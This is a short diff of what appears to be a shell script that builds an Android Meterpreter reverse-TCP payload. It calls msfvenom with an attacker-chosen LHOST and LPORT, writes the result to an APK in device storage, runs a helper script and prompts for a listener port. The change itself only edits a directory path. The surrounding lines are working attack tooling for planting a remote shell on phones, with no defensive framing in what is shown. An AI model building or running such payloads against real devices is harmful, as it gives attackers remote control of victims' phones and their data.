@@ -28,7 +28,7 @@ cd /sdcard
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> $name.apk
 echo "$gre PAYLOAD created successfully ..check in storage....>>"
 echo "$gre path is `pwd`/$name.apk "
-cd $HOME
+cd $HOME/andro
 python2 script.py
 rm -rf files.rc
 echo -n "$blu Enter listionar port :- "
